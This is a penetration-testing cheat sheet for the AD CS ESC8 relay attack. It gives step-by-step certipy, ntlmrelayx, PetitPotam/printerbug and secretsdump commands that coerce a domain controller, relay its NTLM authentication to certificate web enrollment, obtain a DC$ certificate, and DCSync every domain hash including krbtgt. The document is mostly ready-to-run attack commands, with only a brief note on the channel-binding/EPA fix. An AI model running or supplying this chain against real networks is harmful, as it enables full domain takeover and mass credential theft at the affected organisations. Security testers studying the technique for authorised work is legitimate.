ADCS Relay - ESC8 - Cheat Sheet

ESC8 chains coercion + NTLM relay + AD CS. Many AD CS installs expose HTTP web
enrollment (certsrv) with NO channel binding, so NTLM auth relayed to it gets a
certificate for the relayed identity. Coerce a Domain Controller, relay its
machine auth to the CA, get a cert for DC$, then PKINIT -> DCSync. One of the
fastest unauth-to-domain-admin chains. Tools: ntlmrelayx, PetitPotam/Coercer,
certipy. Use nxc for follow-on.
Replace the placeholders (<...>) with your own values.


Step 1 - Confirm ESC8 is present (HTTP enrollment enabled)

    certipy find -u <user>@<domain> -p <password> -dc-ip <dc-ip> -stdout -vulnerable

Look for "ESC8" / "Web Enrollment: Enabled" and "Request Disposition: Issue".
The endpoint is usually:  http://<ca-host>/certsrv/certfnsh.asp


Step 2 - Start the relay to the CA web enrollment

Target the CA's HTTP enrollment and ask for a DC-capable template:

    impacket-ntlmrelayx -t http://<ca-host>/certsrv/certfnsh.asp \
        -smb2support --adcs --template DomainController

Keep this running. For a normal user/computer target use --template User instead.


Step 3 - Coerce a Domain Controller to authenticate to you

In a second terminal (see authentication-coercion cheatsheet):

    impacket-petitpotam <attacker-ip> <dc-ip>
    # or:
    impacket-printerbug <domain>/<user>:<password>@<dc-ip> <attacker-ip>
    # or Coercer for all methods at once

The DC$ machine account authenticates to ntlmrelayx, which relays it to the CA.


Step 4 - Grab the issued certificate

ntlmrelayx prints a base64 PFX (or saves a .pfx) for the relayed account, e.g.
the DC machine account DC$. Save it as dc.pfx.


Step 5 - Authenticate with the cert -> recover hash / TGT

    certipy auth -pfx dc.pfx -dc-ip <dc-ip>

This PKINIT-authenticates as DC$ and prints its NT hash + caches a TGT.


Step 6 - DCSync / domain takeover

A Domain Controller machine account can replicate secrets:

    export KRB5CCNAME=<dc>.ccache
    impacket-secretsdump -k -no-pass <domain>/'<DC-NAME>$'@<dc-fqdn>
    # or with the recovered hash:
    impacket-secretsdump <domain>/'<DC-NAME>$'@<dc-fqdn> -hashes :<dc-nt-hash>

You now have krbtgt + all hashes -> golden ticket / full domain control.


Variations
  - certipy can do the relay end-to-end:
        certipy relay -target http://<ca-host> -template DomainController
    then coerce as in Step 3.
  - Relay a normal user instead of DC$ (--template User) to get a user cert ->
    impersonate that user.
  - ESC11 (RPC enrollment) / ESC8 over RPC: relay to the CA's ICPR RPC endpoint
    when HTTP is disabled but RPC enrollment lacks packet integrity.


Cautions
  - Channel binding / Extended Protection (EPA) on the CA web endpoint, or
    HTTPS-only + EPA, breaks ESC8.
  - This issues a real cert in the CA logs - note the serial for cleanup.
  - Clock skew breaks PKINIT: sudo ntpdate <dc-ip>
  - Authorized testing only.


Key idea: ESC8 is the relay version of the ADCS ESC attacks. Instead of needing
enrollment rights yourself, you make a privileged machine (the DC) authenticate
to you and relay that NTLM auth to the CA's unprotected HTTP enrollment - the CA
hands back a certificate for that machine. A DC$ certificate is effectively the
domain, because PKINIT + DCSync follow directly. The fix is channel binding /
EPA on the enrollment endpoints. Pairs with authentication-coercion and
adcs-esc-attacks.
